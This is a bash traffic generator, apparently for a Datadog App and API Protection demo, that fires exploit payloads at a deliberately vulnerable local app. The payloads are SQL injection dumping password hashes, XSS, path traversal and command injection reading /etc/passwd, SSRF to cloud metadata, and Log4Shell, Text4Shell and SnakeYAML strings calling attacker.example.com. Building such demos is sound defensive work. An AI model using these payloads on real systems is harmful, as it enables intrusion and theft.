#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# MALICIOUS traffic generator (SAFE to run — this is YOUR demo app).
# Sends real exploit-shaped payloads so App & API Protection (AAP) raises live
# Security Signals, IAST confirms exploitability, and you can demo blocking.
#
# Some attacks are sent WHILE AUTHENTICATED as bob.approver so the signal is
# attributed to a specific account ("whose account is compromised") + source IP.
#
# Usage:  ./scripts/attack.sh [BASE_URL]
# ─────────────────────────────────────────────────────────────────────────────
set -uo pipefail

BASE="${1:-${BASE_URL:-http://localhost:8080}}"
hit() { echo "  → $1"; curl -sS -o /dev/null -w "     HTTP %{http_code}\n" "${@:2}"; }

echo "▶ Attack traffic against ${BASE}"

# Authenticate as bob.approver → attribute the following attacks to his account.
TOKEN="$(curl -sS -X POST "${BASE}/login" -H 'Content-Type: application/json' \
  -d '{"username":"bob.approver","password":"approve123"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')"
AUTH=(-H "Authorization: Bearer ${TOKEN}")
[ -n "${TOKEN}" ] && echo "  ✓ authenticated as bob.approver (attacks attributed to usr.id=bob.approver)"

echo "── First-party vulns (IAST + AAP) ─────────────────────────────────────────"

# SQL injection (centerpiece) — authenticated, so signal ties to bob.approver
hit "SQLi: workers/search  ' OR '1'='1" "${AUTH[@]}" \
  --get --data-urlencode "name=' OR '1'='1" "${BASE}/api/workers/search"
hit "SQLi: UNION exfil of users table" "${AUTH[@]}" \
  --get --data-urlencode "status=' UNION SELECT username,password_md5,email,role,'x' FROM users --" "${BASE}/api/timesheets/search"

# Reflected XSS
hit "XSS: greeting <script>" "${AUTH[@]}" \
  --get --data-urlencode "name=<script>alert(document.cookie)</script>" "${BASE}/api/greeting"

# Path traversal
hit "Path traversal: ../../../etc/passwd" "${AUTH[@]}" \
  --get --data-urlencode "file=../../../../etc/passwd" "${BASE}/api/documents/download"

# Command injection
hit "Cmd injection: ; cat /etc/passwd" "${AUTH[@]}" \
  --get --data-urlencode "host=127.0.0.1; cat /etc/passwd" "${BASE}/api/admin/ping"

# SSRF (cloud metadata endpoint)
hit "SSRF: 169.254.169.254 metadata" "${AUTH[@]}" \
  --get --data-urlencode "url=http://169.254.169.254/latest/meta-data/" "${BASE}/api/vendors/logo"

echo "── Open-source CVE exploitation (SCA reachability + AAP) ───────────────────"

# Log4Shell via header (anonymous — external attacker shape)
hit "Log4Shell: \${jndi:ldap://...} header" \
  -H 'X-Api-Version: ${jndi:ldap://attacker.example.com/a}' "${BASE}/api/status"

# Text4Shell via commons-text interpolation
hit "Text4Shell: \${script:...}" \
  --get --data-urlencode 'query=${script:javascript:java.lang.Runtime.getRuntime().exec("id")}' "${BASE}/api/lookup"

# SnakeYAML deserialization
hit "SnakeYAML: !!javax.script.ScriptEngineManager payload" \
  -X POST -H "Content-Type: text/plain" \
  --data '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.example.com/"]]]]' \
  "${BASE}/api/vendors/import-yaml"

echo "── Recon / scanner fingerprint (AAP) ──────────────────────────────────────"

# Security-scanner user-agent → AAP flags automated tooling
hit "Scanner UA: sqlmap" -A "sqlmap/1.7-dev" "${BASE}/api/workers/search?name=x"
hit "Scanner UA: Nikto"  -A "Mozilla/5.00 (Nikto/2.1.6)" "${BASE}/api/vendors"

echo "▶ Done. Datadog → App and API Protection → Signals (attacker + usr.id + endpoint)."
echo "  To demo BLOCKING: add bob.approver / the source IP to a blocklist, or enable a"
echo "  custom in-app WAF rule (see MITIGATION.md), then re-run this script."
